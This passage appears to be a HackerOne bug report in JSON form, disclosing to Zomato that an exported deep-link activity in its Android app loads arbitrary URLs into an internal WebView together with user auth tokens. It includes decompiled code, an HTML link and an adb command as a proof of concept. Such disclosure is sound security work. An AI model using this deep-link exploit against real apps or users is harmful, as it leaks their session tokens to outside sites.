<span class=\"o\">{</span>\n                                        <span class=\"n\">e</span><span class=\"o\">(</span><span class=\"n\">parse</span><span class=\"o\">);</span> <span class=\"c1\">// url should look like zomato://treatswebview?url=</span>\n                                    <span class=\"o\">}</span>\n</code></pre><pre class=\"highlight java\"><code>        <span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">e</span><span class=\"o\">(</span><span class=\"n\">android</span><span class=\"o\">.</span><span class=\"na\">net</span><span class=\"o\">.</span><span class=\"na\">Uri</span> <span class=\"n\">uri</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">android</span><span class=\"o\">.</span><span class=\"na\">support</span><span class=\"o\">.</span><span class=\"na\">v4</span><span class=\"o\">.</span><span class=\"na\">app</span><span class=\"o\">.</span><span class=\"na\">TaskStackBuilder</span> <span class=\"n\">v</span> <span class=\"o\">=</span> <span class=\"n\">v</span><span class=\"o\">();</span>\n            <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">String</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"n\">com</span><span class=\"o\">.</span><span class=\"na\">zomato</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">.</span><span class=\"na\">b</span><span class=\"o\">.</span><span class=\"na\">g</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">(</span><span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">getQueryParameter</span><span class=\"o\">(</span><span class=\"s\">&quot;url&quot;</span><span class=\"o\">));</span> <span class=\"c1\">// decode of the query parameter</span>\n            <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">String</span> <span class=\"n\">str</span> <span class=\"o\">=</span> <span class=\"s\">&quot;&quot;</span><span class=\"o\">;</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">getQueryParameter</span><span class=\"o\">(</span><span class=\"s\">&quot;navigation_bar_title&quot;</span><span class=\"o\">)</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">str</span> <span class=\"o\">=</span> <span class=\"n\">com</span><span class=\"o\">.</span><span class=\"na\">zomato</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">.</span><span class=\"na\">b</span><span class=\"o\">.</span><span class=\"na\">g</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">(</span><span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">getQueryParameter</span><span class=\"o\">(</span><span class=\"s\">&quot;navigation_bar_title&quot;</span><span class=\"o\">));</span> <span class=\"c1\">// page title</span>\n            <span class=\"o\">}</span>\n            <span class=\"n\">android</span><span class=\"o\">.</span><span class=\"na\">content</span><span class=\"o\">.</span><span class=\"na\">Intent</span> <span class=\"n\">intent</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">android</span><span class=\"o\">.</span><span class=\"na\">content</span><span class=\"o\">.</span><span class=\"na\">Intent</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">,</span> <span class=\"n\">com</span><span class=\"o\">.</span><span class=\"na\">library</span><span class=\"o\">.</span><span class=\"na\">zomato</span><span class=\"o\">.</span><span class=\"na\">ordering</span><span class=\"o\">.</span><span class=\"na\">utils</span><span class=\"o\">.</span><span class=\"na\">ZUtil</span><span class=\"o\">.</span><span class=\"na\">getClassForWebViewNavigationType</span><span class=\"o\">(</span><span class=\"n\">uri</span><span class=\"o\">));</span>\n            <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;url&quot;</span><span class=\"o\">,</span> <span class=\"n\">a</span><span class=\"o\">);</span>\n            <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;title&quot;</span><span class=\"o\">,</span> <span class=\"n\">str</span><span class=\"o\">);</span>\n            <span class=\"c1\">// starting TreatsWebViewActionBarActivity</span>\n</code></pre>\n<p>File <code>com/library/zomato/ordering/webview/TreatsWebViewActionBarActivity.java</code></p>\n<pre class=\"highlight java\"><code>            <span class=\"n\">android</span><span class=\"o\">.</span><span class=\"na\">os</span><span class=\"o\">.</span><span class=\"na\">Bundle</span> <span class=\"n\">extras</span> <span class=\"o\">=</span> <span class=\"n\">getIntent</span><span class=\"o\">().</span><span class=\"na\">getExtras</span><span class=\"o\">();</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">extras</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">extras</span><span class=\"o\">.</span><span class=\"na\">containsKey</span><span class=\"o\">(</span><span class=\"s\">&quot;url&quot;</span><span class=\"o\">))</span> <span class=\"o\">{</span>\n                    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">mUrl</span> <span class=\"o\">=</span> <span class=\"n\">extras</span><span class=\"o\">.</span><span class=\"na\">getString</span><span class=\"o\">(</span><span class=\"s\">&quot;url&quot;</span><span class=\"o\">);</span> <span class=\"c1\">// </span>\n                <span class=\"o\">}</span>\n</code></pre><pre class=\"highlight java\"><code>        <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">loadWebView</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n            <span class=\"k\">if</span> <span class=\"o\">(!</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">hasLoadedBefore</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">com</span><span class=\"o\">.</span><span class=\"na\">zomato</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">.</span><span class=\"na\">b</span><span class=\"o\">.</span><span class=\"na\">g</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">mWebViewURL</span><span class=\"o\">))</span> <span class=\"o\">{</span>\n                <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">zomatoWebView</span><span class=\"o\">.</span><span class=\"na\">loadUrl</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">mWebViewURL</span><span class=\"o\">,</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">httpHeaders</span><span class=\"o\">);</span> <span class=\"c1\">// mWebViewURL == mUrl</span>\n                <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">hasLoadedBefore</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">}</span>\n</code></pre>\n<p>PoC video is very simple:<br>\n{F277437}</p>\n\n<p>Code on local server:</p>\n<pre class=\"highlight html\"><code><span class=\"cp\">&lt;!DOCTYPE html&gt;</span>\n<span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;head&gt;&lt;title&gt;</span>Zaheck page<span class=\"nt\">&lt;/title&gt;&lt;/head&gt;</span>\n<span class=\"nt\">&lt;body</span> <span class=\"na\">style=</span><span class=\"s\">&quot;text-align: center;&quot;</span><span class=\"nt\">&gt;</span>\n    <span class=\"nt\">&lt;h1&gt;&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;zomato://treatswebview/?url=http://google.com&amp;navigation_bar_title=wow&quot;</span><span class=\"nt\">&gt;</span>Begin zaheck!<span class=\"nt\">&lt;/a&gt;&lt;/h1&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>All tokens were sent to Google page:<br>\n{F277440}</p>\n\n<p>Third-party apps can also attack your app, PoC from ADB:</p>\n<pre class=\"highlight plaintext\"><code>adb shell am start -n com.application.zomato/.activities.DeepLinkRouter -a android.intent.action.VIEW -d &quot;zomato://treatswebview/?url=http://google.com&amp;navigation_bar_title=wow&quot;\n</code></pre>\n<p>Hopefully in this case the latest app, but not 2 year old build :)</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>1) Leakage of user tokens to arbitrary sites<br>\n2) XSS/Ability of open arbitrary sites in your internal WebView</p>\n", 
    "vulnerability_information": "Hi, I'd like to report a bug which allows to theft user data even without installing third-party apps.\n\nActivity \n```xml\n        <activity android:theme=\"@style/ZomatoTranslucentTheme\" android:label=\"@string/app_name\" android:name=\"com.application.zomato.activities.DeepLinkRouter\" android:screenOrientation=\"portrait\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"zomato\"/>\n            </intent-filter>\n        </activity>\n```\nis exported, and can be accessed by browser. When any WebView (in a client app, or a browser) meets a ``` zomato://etc ``` URL it will automatically launch Zomato app.\n\nFile ``` com/application/zomato/activities/DeepLinkRouter.java ```\n```java\n\t        } else if (!(getIntent() == null || getIntent().getAction() == null || !\"android.intent.action.VIEW\".equals(getIntent().getAction()))) {\n\t            this.c = getIntent().getData().toString(); // getting zomato://etc URL\n\t        }\n\t        c(this.c);\n```\n```java\n\t    private void c(java.lang.String str) {\n\t        boolean z = false;\n\t        boolean z2 = true;\n\t        try {\n\t            android.net.Uri parse = android.net.Uri.parse(str);\n\t            if (\"zomato\".equals(parse.getScheme()) || \"zomatodelivery\".equals(parse.getScheme())) {\n\t                java.util.List pathSegments;\n\t                java.lang.String host = parse.getHost();\n```\n```java\n\t                                } else if (\"treatswebview\".equals(host)) {\n\t                                    e(parse); // url should look like zomato://treatswebview?url=\n\t                                }\n```\n```java\n\t    private void e(android.net.Uri uri) {\n\t        android.support.v4.app.TaskStackBuilder v = v();\n\t        java.lang.String a = com.zomato.a.b.g.a(uri.getQueryParameter(\"url\")); // decode of the query parameter\n\t        java.lang.String str = \"\";\n\t        if (uri.getQueryParameter(\"navigation_bar_title\") != null) {\n\t            str = com.zomato.a.b.g.a(uri.getQueryParameter(\"navigation_bar_title\")); // page title\n\t        }\n\t        android.content.Intent intent = new android.content.Intent(this, com.library.zomato.ordering.utils.ZUtil.getClassForWebViewNavigationType(uri));\n\t        intent.putExtra(\"url\", a);\n\t        intent.putExtra(\"title\", str);\n\t        // starting TreatsWebViewActionBarActivity\n```\n\nFile ``` com/library/zomato/ordering/webview/TreatsWebViewActionBarActivity.java ```\n```java\n\t        android.os.Bundle extras = getIntent().getExtras();\n\t        if (extras != null) {\n\t            if (extras.containsKey(\"url\")) {\n\t                this.mUrl = extras.getString(\"url\"); // \n\t            }\n```\n```java\n\t    public void loadWebView() {\n\t        if (!this.hasLoadedBefore && !com.zomato.a.b.g.a(this.mWebViewURL)) {\n\t            this.zomatoWebView.loadUrl(this.mWebViewURL, this.httpHeaders); // mWebViewURL == mUrl\n\t            this.hasLoadedBefore = true;\n\t        }\n\t    }\n```\n\nPoC video is very simple:\n{F277437}\n\nCode on local server:\n```html\n<!DOCTYPE html>\n<html>\n<head><title>Zaheck page</title></head>\n<body style=\"text-align: center;\">\n\t<h1><a href=\"zomato://treatswebview/?url=http://google.com&navigation_bar_title=wow\">Begin zaheck!</a></h1>\n</body>\n</html>\n```\n\nAll tokens were sent to Google page:\n{F277440}\n\nThird-party apps can also attack your app, PoC from ADB:\n```\nadb shell am start -n com.application.zomato/.activities.DeepLinkRouter -a android.intent.action.VIEW -d \"zomato://treatswebview/?url=http://google.com&navigation_bar_title=wow\"\n```\n\nHopefully in this case the latest app, but not 2 year old build :)\n\n## Impact\n\n1) Leakage of user tokens to arbitrary sites\n2) XSS/Ability of open arbitrary sites in your internal WebView", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.zomato.com", 
            "about": "The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide.", 
            "twitter_handle": "Zomato", 
            "name": "Zomato"
        }, 
        "handle": "zomato", 
        "url": "https://hackerone.com/zomato", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/943/7b54bc7a4a265c47ec0d946a6abf079078b82401_small.png?1526447675", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/002/943/dbb71f3e2a0e73fe819c0c2a3e4fbcdd24d138e9_medium.png?1526447675"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 2943, 
        "default_currency": "usd"
    }, 
    "is_published": false
}